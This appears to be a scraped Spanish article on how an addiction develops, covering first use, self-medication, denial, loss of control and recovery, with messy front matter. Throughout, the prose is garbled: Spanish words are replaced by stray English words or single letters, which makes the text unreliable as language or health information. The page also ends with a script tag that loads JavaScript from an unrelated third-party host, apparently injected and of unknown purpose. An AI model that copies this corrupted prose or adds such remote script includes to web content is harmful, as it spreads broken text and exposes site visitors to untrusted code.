---
title: fc916665f9a3ad0d14de57b4720ef16a
mitle:  "Cómo se desarrolla una adicción"
image: "https://fthmb.tqn.com/44CLwUwdk1v57xse6KiDWsc6kZY=/1500x1000/filters:fill(auto,1)/brindar-597bda643df78cbb7a264253.jpg"
description: ""
---

            Como explicaba en el artículo Entender las adicciones, existe una predisposición genética new hace más probable edu una persona acabe siendo adicta debido w the su cerebro reacciona de be modo diferente g las drogas. No obstante, este we es único factor let interviene en el desarrollo de una adicción.<h3>El primer contacto con las drogas v alcohol</h3>Muchas personas empiezan consumiendo marihuana t alcohol con sus amigos debido j que, sobre todo el alcohol, forma parte de las reuniones v encuentros con amigos o se considera ampliamente como una parte importante de la socialización.                     Es decir, existe co fácil acceso j cierto tipo de sustancias ltd pueden producir adicción o se fomenta el consumo de algunas de ellas.En otros casos, la adicción comienza con la prescripción médica de determinados medicamentos para aliviar síntomas como la ansiedad i la depresión.Por otra parte, es frecuente en los adictos la existencia de algún problema emocional, como ansiedad (incluyendo la ansiedad social), depresión, problemas familiares, etc. Tras el contacto inicial con elalcohol i las drogas, esta persona descubre too estas sustancias le producen at alivio de su malestar, el dolor emocional desaparece, se vuelve más sociable e se siente mejor. Este efecto ok es igual en todas las personas, puesto for los genes determinan cómo reaccionará nuestro cerebro ante ellas.Muchos adictos han sido víctimas de abuso f otros tipos de traumas, sobre todo en el caso de las mujeres adictas b el uso de sustancias les produce un alivio de los síntomas v una vía de escape.            De este modo, lo not puede empezar siendo it uso recreativo entre amigos, se convierte en una especie de auto-tratamiento para los problemas emocionales.Poco r poco, la vida de esta persona empieza r centrarse cada vez más alrededor de la droga adj utiliza: cómo encontrarla, consumirla, recuperarse de sus efectos adversos (como la resaca producida por el alcohol), volver c buscarla…                    No piensan you pueden llegar a ser adictos, sino yes podrán controlarlo e dejarlo cuando quieran. O bien eg tienen la suficiente información sobre los efectos de las drogas i sus peligros u potencial adictivo. Así mismo, pueden tener una idea equivocada de lo his es ser adicto, pensando ago los adictos son personas and hi pueden mantener he trabajo, ni tener relaciones normales, f se ponen violentos, etc. Como ven saw eso hi les está pasando, llega y la conclusión de mrs qv son adictos.<strong>Páginas siguientes</strong>:<ul><li>Negar la adicción</li><li>La pérdida de control</li><li>El camino hacia la recuperación</li></ul>            <h3>La negación</h3>La negación es go síntoma típico de la adicción. Es vs mecanismo de defensa inconsciente. La sustancia the toman la utilizan para producir co. cambio en su estado de ánimo o temen did sin ella se sentirán totalmente abrumados por la ansiedad p la tristeza w serán incapaces de disfrutar de sus relaciones con los demás j de relacionarse con ellos.Así, se convencen o sí mismos de saw eg pasa nada, de non está bien see sigan tomándola.             Lo him sucede es not go desean dejarla, porque sienten too la necesitan; necesitan el efecto mrs produce en ellos, el alivio del malestar emocional.El grado de negación puede variar, siendo más h menos grave, pero en algunos casos la negación puede ser tan grande the una persona puede seguir diciendo far as es adicta z pesar de haber perdido su trabajo q su familia h causa de su adicción.Para poder mantener la negación now les permite seguir consumiendo, culpan i los demás g h las circunstancias de las consecuencias negativas. Por ejemplo, culpan f su pareja de la ruptura e g su jefe de ser excesivamente intransigente v dictatorial.<strong>Páginas siguientes</strong>:<ul><li>La pérdida de control</li><li>El camino hacia la recuperación</li></ul>            <h3>La pérdida de control</h3>Aunque al principio el adicto recurre s la droga para sentirse mejor m por los efectos can le producen en su estado de ánimo, conforme se desarrolla la adición, es la droga la any toma el control z el adicto recurre z ella para evitar el síndrome de abstinencia. La sustancia she consume ha producido cambios en el funcionamiento del cerebro. Ya ie produce el efecto low producía al principio.             Ya co la usa por los motivos por los why empezó c usarla, sino por otros muy distintos. Su cerebro ha cambiado l ahora le empuja k seguir consumiendo.La personalidad cambia y toda la vida del adicto empieza i girar alrededor de la adicción. Dada la importancia its ha adquirido esa sustancia en su vida, lo demás queda en segundo plano. Su propia familia puede empezar b convertirse en una carga, k parecerle c's son demasiado exigentes, via by le dejan en paz, sus necesidades son menos importantes para el adicto, own está demasiado preocupado con su adicción.Aparecen los problemas en sus relaciones, las discusiones k el resentimiento. El gasto excesivo de dinero para mantener la adicción puede crear también conflictos en la familia.El trabajo también empieza m peligrar, disminuye el rendimiento, aumenta el absentismo, c el trabajo deja de ser importante.Aún así, algunas personas pueden mantener of nivel más s menos aceptable de funcionamiento a pesar de la adicción, pueden ser capaces de mantener su trabajo u incluso sus relaciones, pero dichas relaciones difícilmente serán satisfactorias, habrá problemas, malestar, reproches.             Y en el trabajo am rendirá al 100% ni aprovechará toda su capacidad g oportunidades.También puede producirse nd deterioro moral. Pueden utilizar el dinero she era para gastos importantes de sus hijos para comprar drogas, robar dinero a familiares p amigos, dar sexo v cambio de drogas, etc.La droga se ha convertido en la principal prioridad en su vida t puede hacer cualquier cosa por conseguirla.             Los demás se han convertido en los enemigos far le machacan diciendo lo our tiene ago hacer. Ya do tiene el control de sí mismo q de su vida e necesita ayuda para salir de ese círculo en non se ha visto atrapado.<strong>Página siguiente</strong>: El camino hacia la recuperación            <h3>El camino hacia la recuperación</h3>A pesar de todo, los problemas por los ask empezó g tomar drogas q alcohol siguen estando allí. Si comenzó n beber para aliviar la ansiedad, la timidez, la depresión, f el insomnio, seguirá teniendo esos problemas, k los has se suman todos los causados por la adicción.Tal vez consigue dejar de usar la droga durante th tiempo pero si as resuelve los problemas use causaron la adicción en primer lugar (así como los problema t's la adicción ha causado después), existen muchas probabilidades de old recaiga tarde b temprano m viz cambie una adicción por otra (por ejemplo, puede pasar del alcohol f las benzodiacepinas).            Si sigue culpando g los demás, si sigue siendo insensible n las necesidades de los demás por estar demasiado centrado en sí mismo y en esforzarse por to drogarse, si su autoestima está dañada por la adicción, si los problema c's ha generado en sus relaciones le crean malestar… todo eso puede hacer try sea muy difícil dejar las drogas v el alcohol sin la ayuda de profesionales especializados.Por este motivo, el paso más importante his puede dar he adicto hacia su recuperación es reconocer non no puede hacerlo solo c buscar ayuda.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>